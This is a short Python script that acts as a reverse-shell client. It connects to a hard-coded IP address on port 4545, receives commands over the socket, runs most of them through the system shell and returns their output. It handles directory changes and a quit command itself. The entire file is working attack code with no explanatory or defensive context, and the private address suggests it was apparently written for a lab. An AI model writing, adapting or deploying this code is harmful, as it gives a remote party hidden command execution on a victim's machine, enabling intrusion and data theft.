import socket
import os
import subprocess

client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host="172.16.166.184"
port=4545
ip=socket.gethostbyname(socket.gethostname())
client.connect((host,port))
print("connected")
while True:
    cmd=client.recv(1024)
    flag=False
    output=""
    if(cmd.decode("utf-8")=="cwd"):
        flag=True
        currentwd=os.getcwd()
        output=currentwd
    elif(cmd.decode("utf-8")=="testing"):
        flag=True
        output=""
    elif(cmd.decode("utf-8")=="quit"):
        print("Program Exit...")
        break
    elif cmd[:2].decode("utf-8") == 'cd':
        flag=True
        try:
            os.chdir(cmd[3:].decode("utf-8"))
            output=" "
        except FileNotFoundError:
            output="File not Found\n"
    elif len(cmd)>0 and flag==False:
        cmdp=subprocess.run(cmd.decode("utf-8"),shell=True,capture_output=True,text=True)
        print("Command executed :"+cmd.decode("utf-8"))
        if cmdp.returncode==0:
            output=''
            if cmdp.stdout is not None:
                output += cmdp.stdout
            if cmdp.stderr is not None:
                output += cmdp.stderr
        else:
            output="Command not Executed\n"
        print("Output : "+output)
    if(output==""):
        output=" "
    client.send(str.encode(output))
    
client.close()
